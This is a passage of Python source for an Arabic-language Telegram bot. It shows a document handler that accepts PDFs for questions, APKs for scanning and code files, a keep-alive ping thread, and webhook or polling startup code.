# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None
    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك.")
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص:\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "🛠️ تم استلام الملف، يمكنك مراجعته.")
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

# ===================== Keep-Alive Thread =====================
def keep_alive():
    if not SERVER_URL:
        return
    ping_url = f"{SERVER_URL}/ping"
    while True:
        time.sleep(300)
        try:
            req_lib.get(ping_url, timeout=10)
            logger.info("✅ Keep-alive ping")
        except Exception as e:
            logger.error(f"❌ فشل Keep-alive: {e}")

# ===================== تشغيل البوت =====================
if __name__ == "__main__":
    bot.remove_webhook()
    if USE_WEBHOOK and SERVER_URL:
        webhook_url = f"{SERVER_URL}/webhook"
        try:
            success = bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET)
            if success:
                logger.info(f"✅ Webhook تم تعيينه: {webhook_url}")
            else:
                logger.warning(f"⚠️ فشل تعيين Webhook.")
        except Exception as e:
            logger.error(f"❌ خطأ في تعيين Webhook: {e}")
    else:
        logger.info("🔄 تشغيل البوت عبر Polling...")
    if SERVER_URL:
        keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_alive_thread.start()
        logger.info("🔄 تم بدء Keep-alive.")
    app.run(host='0.0.0.0', port=PORT, debug=False)
